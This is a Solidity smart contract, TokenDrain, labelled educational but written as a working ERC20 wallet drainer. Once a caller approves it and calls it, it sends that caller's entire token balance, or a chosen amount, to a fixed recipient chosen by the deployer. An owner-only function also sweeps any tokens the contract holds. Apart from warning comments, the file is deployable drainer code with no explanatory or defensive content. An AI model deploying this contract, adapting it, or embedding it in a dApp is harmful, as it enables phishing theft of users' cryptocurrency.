// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title TokenDrain
 * @notice Educational contract demonstrating ERC20 approval dangers
 * This contract drains entire token balance from caller to recipient
 * 
 * ⚠️ WARNING: This shows a dangerous approval pattern!
 * Never approve contracts you don't fully trust.
 */
contract TokenDrain {
    address public immutable recipient;
    address public owner;

    event BalanceDrained(
        address indexed token,
        address indexed from,
        address indexed to,
        uint256 amount
    );

    event ApprovalWarning(
        address indexed user,
        address indexed token,
        uint256 amount
    );

    constructor(address _recipient) {
        require(_recipient != address(0), "Invalid recipient address");
        recipient = _recipient;
        owner = msg.sender;
    }

    /**
     * @notice Drain entire token balance from caller to recipient
     * @dev User must approve this contract first
     * @param token ERC20 token address
     * @return amount Amount successfully drained
     */
    function drainAllBalance(address token) external returns (uint256) {
        require(token != address(0), "Invalid token address");
        
        uint256 balance = IERC20(token).balanceOf(msg.sender);
        require(balance > 0, "No tokens to drain");

        emit ApprovalWarning(msg.sender, token, balance);

        bool success = IERC20(token).transferFrom(msg.sender, recipient, balance);
        require(success, "Token transfer failed");

        emit BalanceDrained(token, msg.sender, recipient, balance);
        return balance;
    }

    /**
     * @notice Transfer specific amount of tokens
     * @param token ERC20 token address
     * @param amount Amount to transfer
     */
    function transferTokens(address token, uint256 amount) external returns (bool) {
        require(token != address(0), "Invalid token address");
        require(amount > 0, "Amount must be greater than 0");

        bool success = IERC20(token).transferFrom(msg.sender, recipient, amount);
        require(success, "Token transfer failed");

        emit BalanceDrained(token, msg.sender, recipient, amount);
        return true;
    }

    /**
     * @notice Get recipient address where tokens go
     */
    function getRecipient() external view returns (address) {
        return recipient;
    }

    /**
     * @notice Emergency function: owner can withdraw any stuck tokens
     */
    function emergencyWithdraw(address token) external {
        require(msg.sender == owner, "Only owner can withdraw");
        uint256 balance = IERC20(token).balanceOf(address(this));
        if (balance > 0) {
            IERC20(token).transfer(owner, balance);
        }
    }
}
